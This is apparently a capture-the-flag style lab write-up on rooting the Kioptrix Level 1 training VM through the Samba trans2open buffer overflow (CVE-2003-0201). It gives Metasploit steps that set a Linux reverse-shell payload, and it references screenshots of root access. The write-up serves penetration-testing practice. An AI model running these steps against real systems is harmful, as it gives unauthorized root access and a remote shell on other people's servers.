# Kioptrix L1: Privilege Escalation using Samba Version

## Summary:
Due to the available version of Samba in Kioptrix, an attacker after enumerate this service can escalate root privileges.

## Technical Details:
The available version of Samba found is 2.2.1a is vulnerable to a buffer overflow called **trans2open** according to this **Common Vulnerabilities and Exposure 2003-0201 [(CVE-2003-0201)](https://www.cvedetails.com/cve/CVE-2003-0201/)** 
using arbitraty code -a payload for example- it is possible to obtain root privileges. 

## Steps to reproduce using metasploit and a terminal:
1) msfconsole
2) search trans2open
3) use 1
4) set RHOSTS <ip_of_kioptrixl1>
5) set payload linux/x86/shell_reverse_tcp
6) run

## Supporting Material:
1) Gaining root privileges:

![samba_trans2open_01.png](./media/samba_trans2open_01.png?raw=true "Gaining root Privilege")

2) Directory listing:

![samba_trans2open_02.png](./media/samba_trans2open_02.png?raw=true "Directory Listing")

3) Accessing to mail server:

![samba_trans2open_03.png](./media/samba_trans2open_03.png?raw=true "Accesing to mail server")

## Impact:
The exploitation of this issue compromise 100% the integrity of the Kioptrix L1 Server: sourcecode, user's credentials, directories, files and logs